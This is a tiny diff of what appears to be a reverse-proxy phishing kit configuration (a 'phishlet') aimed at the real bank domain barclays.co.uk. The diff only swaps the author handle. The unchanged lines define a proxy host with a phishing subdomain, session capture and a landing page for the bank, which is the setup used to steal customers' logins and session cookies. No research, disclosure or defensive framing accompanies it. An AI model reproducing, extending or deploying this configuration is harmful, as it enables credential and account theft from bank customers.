@@ -1,4 +1,4 @@
-author: '@An0nud4y'
+author: '@AN0n'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'bank', orig_sub: 'bank', domain: 'barclays.co.uk', session: true, is_landing: true}
